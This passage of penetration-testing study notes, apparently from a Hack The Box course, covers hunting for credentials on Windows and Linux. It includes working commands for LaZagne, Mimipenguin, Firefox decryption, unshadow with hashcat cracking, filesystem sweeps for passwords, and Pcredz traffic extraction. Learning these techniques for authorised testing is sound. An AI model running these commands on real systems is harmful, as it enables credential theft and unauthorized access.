searches OS Settings, file system for files & apps containing key term searched for

**** LaZagne
- [[https://github.com/AlessandroZ/LaZagne][LaZagne]]
- discover creds that web browsers or other installed apps may insecurely store

***** Modules
****** Browsers
- extract passw from browsers
****** Chats
- extract passw from chat apps (skype)
****** Mails
- searches through mailboxes for passw
****** Memory
- dumps passw from mem (targets =KeePass= & =LSASS=)
****** Sysadmin
- extract passw from configuration files of various sysadmin tools (=OpenVPN=, =WinSCP=)
****** Windows
- windows specific creds targeting LSA secrets, Credential Manager, etc
****** Wifi
- Wifi creds
  
***** starting
- ~start LaZagne.exe all~ -> runs all included modules, ~-vv~ -> verbosity

****** findstr
- search from patterns across many filetypes
- ~findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml~

*** Additional Considerations

**** Places to keep in mind when cred hunting
- Passwords in Group Policy in SYSVOL share
- Passwords in scripts in SYSVOL share
- Password in scripts on IT shares
- Passwords in =web.config= files on dev machines & IT shares
- Passwords in =unattend.xml=
- Passwords in AD user / computer descr fields
- KeePass DB
- Found on user systems & shares
- files w names like =pass.txt=, =passwords.docx=, =passwords.xlsx= found on user systems, shares, & [[https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration][Sharepoint]]

* Extracting Passwords from Linux Systems

** Linux Authentication Process
+ https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf
+ supports multiple authentication mechanisms
+ most common -> =PAM= (=Plugaable Authentication Modules=)
  - modules responsible -> =pam_unix.so= / =pam_unix2.so= -> =/usr/lib/x86_64-linux-gnu/security= (debian)
  - manage user info, authentication, sessions, password changes

+ =pam_unix.so= uses standardized API calls from system libraries to update account information.
+ primary files it reads from & write to -> =/etc/passwd= & =/etc/shadow=
+ also includes modules for LDAP, mount operations, Kerberos Auth

*** Passwd file
- contains info about every user on system.
- readable by all users & services
- each entry corr to single user & consists of =seven fields=, separated by =:=

***** Fields
1. Username: =htb-student=
2. Password: =x=
3. User ID: =1000=
4. Group ID: =1000=
5. [[https://en.wikipedia.org/wiki/Gecos_field][GECOS]]: =,,,=
6. Home Dir: =/home/htb-student=
7. Default Shell: =/bin/bash=

***** Password field
- x -> password stored in hash form in =/etc/shadow.=
- if passwd file writeable, we can remove password field for root user (root::0:0:root:/root:/bin/bash)

*** Shadow File
- if no entry in =/etc/shadow= for user listed in =/etc/passwd=, invalid

***** fields -> =htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::=
1) Username: =htb=student=
2) Password: $y$j9T$3QSBB6CbHEu...SNIP...f8M -> =$<id>$<salt>$<hased>=
3) Last Change: =18955=
4) Min age: =0=
5) Max age: =99999=
6) Warning Period: =7=
7) Inactivity Period: =-=
8) Expiration Date: =-=
9) Reserved field: =-=

# if password field has character such as =!= or =*=, or is *empty*, user cannot log in using Unix password.

*** Opasswd
- previous passwords stored here

*** Cracking linux Creds
**** Unshadow
- combines passwd & shadow files into single file
#+begin_src bash
biscuitrescue@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
biscuitrescue@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
biscuitrescue@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
biscuitrescue@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
#+end_src

** Credential Hunting in Linux

*** Files
- Everything is a file

***** Categories
- Configs
- DB
- Notes
- scripts
- cronjobs
- ssh keys

**** Searching for configs
- =.conf=, =.config=, =.cnf=
- ~for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done~
- ~for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done~

**** Searching for DB
- ~for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done~

**** Searching for Notes
- ~biscuitrescue@htb[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"~

**** Searching for Scripts
~for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done~

**** Enumerating cronjobs
- =/etc/crontab= -> system wide area
- =/etc/cron= + =.daily= / =.hourly= / =.monthly= / =.weekly=

**** Enumerating History Files
- =.bash_history=
- ~tail -n5 /home/*/.bash*~

**** Enumerating History Files
1. app logs
2. event logs
3. service logs
4. system logs

~for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done~

*** Memory & Cache
- apps & processes store them in mem or files to reuse

**** Mimipenguin
~sudo python3 mimipenguin.py~

**** LaZagne
~sudo python2.7 laZagne.py all~

**** Browser Creds
~ls -l .mozilla/firefox/ | grep defaults~
~cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .~

***** firefox decrypt
- ~python3 firefox_decrypt~

***** LaZagne browsers
- python3 lazagne.py browsers
 
** Credential Hunting in Network Traffic
- =pcredz= -> tool that can quickly scan network traffic for cleartext data

*** Wireshark
- packet analyzer.
- has powerful filter engine for live & captured network traffic

***** filters
+ ~ip.addr == <ip>~
+ ~tcp.port == 80~
+ ~http~
+ ~dns~
+ ~tcp.flags.syn \=\=1 && tcp.flags.ack == 0~
+ ~icmp~
+ ~http.request.method == "POST"~
+ ~tcp.stream eq 53~
+ ~tcp.stream eq 53~
+ ~eth.addr == 00:11:22:33:44:55~
+ ~ip.src \=\= <src-ip> && ip.dst == <dest-ip>~

*** Pcredz
+ tool used to extract creds from live traffic/network packet captures
+ supports extracting:
  * credit card numbers
  * POP creds
  * SMTP creds
  * IMAP creds
  * SNMP community strings
  * FTP creds
  * Creds from HTTP NTLM/Basic Headers, HTTP forms
  * NTLMv1/v2 hashes from various traffic including DCE-TPC, SMBv1/2, LDAP, MSSQL & HTTP
  * Kerberos (AS-REQ Pre-Auth etype 23) hashes
+ ~./Pcredz -f demo.pcaping -t -v~
